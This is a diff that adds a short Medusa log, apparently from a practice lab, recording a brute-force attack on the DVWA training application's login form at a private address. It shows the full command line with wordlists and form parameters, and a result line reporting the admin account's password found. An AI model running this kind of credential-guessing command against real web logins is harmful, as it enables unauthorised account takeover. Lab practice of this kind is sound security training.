@@ -1,0 +1,4 @@
+# Medusa v.2.3 (2026-11-09 18:06:46)
+# medusa -h 192.168.56.102 -U wordlists/dvwa-users.txt -P wordlists/dvwa-passwords.txt -M web-form -m FORM:/dvwa/vulnerabilities/brute/ -m FORM-DATA:get?username=&password=&Login=Login -m DENY-SIGNAL:Username and/or password incorrect -m CUSTOM-HEADER:Cookie: PHPSESSID=<REDACTED>; security=low -t 1 -f -v 4 -O logs/05-dvwa-medusa.log 
+2026-11-09 18:06:46 ACCOUNT FOUND: [web-form] Host: 192.168.56.102 User: admin Password: password [SUCCESS]
+# Medusa has finished (2026-11-09 18:06:46).
